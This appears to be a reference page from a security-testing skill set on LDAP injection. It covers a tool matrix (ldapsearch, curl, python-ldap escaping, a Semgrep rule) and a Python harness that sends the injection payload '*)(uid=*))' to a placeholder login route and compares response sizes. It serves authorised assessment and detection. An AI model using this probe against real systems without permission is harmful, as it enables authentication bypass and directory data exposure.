# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`ldap-and-xpath-injection-ldap`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `ldapsearch` | `ldapsearch -x -H ldap://dir.example -b "ou=people,dc=example,dc=com" "(uid=testuser)"` | Capture the baseline entry count for a known-good filter before sending any metacharacter probe | Linux, macOS, Windows |
| `curl` | `curl -sS -o /dev/null -w '%{http_code} %{size_download}\n' 'https://target.example/login?user=testuser'` | Record the status and body-size baseline the filter differential is measured against | Cross-platform |
| `python-ldap` | `python -c "import ldap.filter; print(ldap.filter.escape_filter_chars('*)(uid=*'))"` | Show the correctly escaped form so the probe can be compared against a safe baseline | Cross-platform |
| `Semgrep` | `semgrep -e '"(&(" + $X' --lang python .` | Find directory filters assembled by string concatenation before runtime testing | Cross-platform |

## Minimal Script Shape

A paired-baseline harness for a login route: it compares the response size for a known user against a presence-filter probe and flags a likely filter injection only when they diverge.

```python
import urllib.parse
import urllib.request

BASE = "https://target.example/login"

def attempt(user):
    q = urllib.parse.urlencode({"user": user, "password": "x"})
    req = urllib.request.Request(BASE + "?" + q,
                                 headers={"User-Agent": "authorised-assessment"})
    with urllib.request.urlopen(req, timeout=10) as r:
        return r.status, len(r.read())

control = attempt("testuser")
probe = attempt("*)(uid=*))")
size_delta = abs(probe[1] - control[1])
print({"control": control, "probe": probe, "size_delta": size_delta,
       "filter_injection_suspected": probe[0] == 200 and size_delta > 32})
```
